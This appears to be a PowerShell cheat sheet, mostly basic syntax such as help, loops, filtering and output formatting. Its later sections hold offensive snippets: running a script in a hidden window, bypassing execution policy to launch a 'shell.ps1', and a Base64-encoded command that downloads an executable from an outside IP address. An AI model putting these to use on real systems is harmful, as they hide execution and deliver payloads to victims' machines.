# Basics powershell commands

## Power basic commands

### Help

```csharp
Get-Help Get-Process
Get-Help *process

Get-Help Get-Process -full
get-help get-command -Parameter *

 Get-Command -CommandType cmdlet -Name *process*

 Get-Command -Verb stop
 Get-help Stop-ASRJob

 Get-Help Out-File -Examples

Get-Command -CommandType cmdlet -Name *Child*

 Get-hotfix KDnumber

 Get-Command -CommandType cmdlet -ParameterName Computername
```

### ls

```csharp
Get-ChildItem  -Include *.ini* -File -Recurse -ErrorAction SilentlyContinue
```

### Output formatting

```csharp
Get-Command -CommandType cmdlet -Name Format*
Get-ChildItem | Format-List
Get-Process | Out-GridView
```

#### Output command into a file, then read it

```csharp
Get-Process | Out-File C:\Users\b3v1l\test.txt
Get-Content C:\Users\b3v1l\test.txt Get-ChildItem | Format-Table * | Out-File .\test.txt
```

### ​​Operator

```csharp
"hello polo" -match "polo"    → true
 "hello polo" -replace "polo","test"
hello test


-ge (equal or greater)
-le (less)
-eq (equal)
-split “Value”
-join
-is int
-is float
```

### Type

```csharp
$var = “test”
$var.GetType()

multi lines:

@"
hello
world
"@


Type conversion:

$a = 3.2 + 3
[int]$a
→ 6
```

### Array

```csharp
$array = 1,"hi",2.2
$array[1] -> “hi”

Empty array:

$empty_Ar = @()
```

### **Conditionnal Statement**

```csharp
 if (((Get-Process).Count) -gt 10) {"ok, 10"} else {"under 10"}

 Switch statement (-Exact, -Wildcard, -regex)

Switch (2) { 1 {"test 1"} 2 {"test2"}}
Switch (211) { 1 {"test 1"} 2 {"test2"} default {"erfff"}}
switch -Wildcard ('abc') { a* {"Q"} *b* {"B"} *c {"v"} }
Switch -Regex -File filename {"REGEX"{$_}}
```

### Loop

```csharp
 PS C:\Users\b3v1l > while ($count -ge 0)
>> { "Number : $count"
>> $count--
>> }

$procs = Get-Process; foreach ($proc in $procs) { $proc.Name}
```

### forEach-Object

```csharp
Get-Process |ForEach-Object {$_.Name}
Get-Process |ForEach-Object {$_.Name, $_.Path}
```

###  **Where-Object**

```csharp
Get-ChildItem |Where-Object {$_.name -match "txt"}
```

### Hidden window

```csharp
powershell -windowstyle hidden script.ps1
```

### Bypass execution restrictions

```cpp
powershell.exe -NoE -Nop -NonI -ExecutionPolicy Bypass -C
powershell.exe -version 2 -exec bypass -C C:\Users\Raziel\AppData\Local\Temp\xyz\shell.ps1
```

### Base64 Encoding

```csharp
$cmd = "IEX(New-Object system.Net.WebClient).DownloadFile('http://10.0.0.17/file.exe', ‘C:\file.exe')"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$encodedCommand = [Convert]::ToBase64String($bytes)
powershell.exe -EncodedCommand $encoded
```

### Powershell Environnement

```csharp
[environment]::Is64BitOperatingsystem 
True 
PS C:\temp>[environment]::Is64BitProcess 
False
```

* Get 64bit powershell

```csharp
C:\Windows\Sysnative\WindowsPowerShell\v1.0>powershell.exe
powershell.exe
Windows PowerShell
Copyright (C) 2016 Microsoft Corporation. All rights reserved.
```

```csharp
PS C:\Windows\system32\WindowsPowerShell\v1.0> 
[environment
]::is64bitprocess True
PS C:\Windows\system32\WindowsPowerShell\v1.0>
```

### Display firewall rules

```csharp
$f=New-object -comObject HNetCfg.FwPolicy2;$f.rules | where {$_.action -eq "0"} | select name,applicationname,localports
```

### Hidden Streams

```csharp
get-content -path c:\temp\hm.txt -stream root.txt
```

